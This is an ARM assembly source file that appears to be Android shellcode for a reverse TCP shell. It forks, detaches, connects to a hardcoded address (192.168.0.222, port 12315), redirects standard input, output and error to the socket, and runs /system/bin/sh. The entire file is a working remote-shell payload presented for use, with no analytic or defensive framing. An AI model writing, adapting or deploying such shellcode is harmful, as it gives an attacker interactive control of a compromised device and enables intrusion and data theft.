/* @idhyt
    android arm shell_reverse_tcp
    parameters      r0-r6
    system call     r7
*/

.globl _start
    .code 32

_start:
    # fork
    MOV             R7, #2
    SVC             0 
    CMP             R0, #0
    BEQ             _child
    # exit parent
    MOV             R0, #0
    MOV             R7, #1
    SVC             0

    # continue if not parent...
_child:
    # setsid in child; 66
    MOV             R7, #0x42
    SVC             0
    # socket/connect/dup2/dup2/dup2
    # socket(2, 1, 0); 281
    MOV             R0, #2
    MOV             R1, #1
    ADD             R2, R1, #5
    MOV             R7, #0x100
    ADD             R7, #0x19
    SVC             0
    # connect(r0, &addr, 16); 283
    MOV             R6, R0
    ADR             R1, struct_addr
    MOV             R2, #0x10
    MOV             R7, #0x100
    ADD             R7, #0x1B
    SVC             0
    # dup2(sockfd, 0); 63
    MOV             R0, R6
    MOV             R1, #0
    MOV             R7, #0x3F 
    SVC             0
    # dup2(sockfd, 1); 63
    MOV             R0, R6
    MOV             R1, #1
    MOV             R7, #0x3F 
    SVC             0
    # dup2(sockfd, 2); 63
    MOV             R0, R6
    MOV             R1, #2
    MOV             R7, #0x3F 
    SVC             0
    # execve(shell, argv, env);
    ADR             R0, shell 
    EOR             R4, R4, R4
    STMFD           SP!, {R4}
    ADR             R3, env 
    STMFD           SP!, {R3}
    MOV             R2, SP
    STMFD           SP!, {R4}
    ADR             R4, argv
    STMFD           SP!, {R4}
    MOV             R1, SP
    MOV             R7, #0xB
    SVC             0

struct_addr:
    # AF_INET = 2 for IPv4
    .short 0x2
    # port 12315
    .short 0x1B30
    # ip
    .byte 192,168,0,222

shell:
    .ascii "/system/bin/sh\0"

argv:
    .ascii "sh\0"

env:
    .ascii "PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\0"
